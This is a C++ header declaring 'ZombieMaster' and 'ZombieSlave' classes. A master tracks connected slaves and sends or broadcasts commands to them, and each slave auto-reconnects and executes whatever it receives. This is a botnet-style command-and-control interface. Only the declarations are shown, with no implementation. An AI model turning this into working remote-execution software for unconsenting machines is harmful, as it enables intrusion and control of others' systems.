#pragma once

#include <string>
#include <vector>
#include <map>
#include <functional>
#include <atomic>
#include <nlohmann/json.hpp>

namespace nonail {

struct SlaveInfo {
    std::string id;
    std::string ip;
    int port = 0;
    std::string status = "connected";
    std::map<std::string, std::string> meta;
    double last_seen = 0.0;
};

class ZombieMaster {
public:
    ZombieMaster(const std::string& password,
                 const std::string& host = "0.0.0.0",
                 int port = 8765);
    ~ZombieMaster();

    void run();   // blocking
    void stop();

    // Send command to specific slave
    std::string send_command(const std::string& slave_id, const std::string& command);

    // Broadcast command to all slaves
    void broadcast(const std::string& command);

    std::vector<SlaveInfo> list_slaves() const;

private:
    std::string password_;
    std::string host_;
    int port_;
    std::atomic<bool> running_{false};

    std::map<std::string, SlaveInfo> slaves_;

    bool authenticate(const std::string& token) const;
    void handle_connection(int fd);
    void heartbeat_loop();
};

class ZombieSlave {
public:
    ZombieSlave(const std::string& master_host,
                int master_port,
                const std::string& password,
                const std::string& slave_id = "");
    ~ZombieSlave();

    void run();   // blocking, auto-reconnect
    void stop();

private:
    std::string master_host_;
    int master_port_;
    std::string password_;
    std::string slave_id_;
    std::atomic<bool> running_{false};

    void connect_and_serve();
    std::string execute_command(const std::string& command);
    std::string generate_auth_token() const;
};

} // namespace nonail
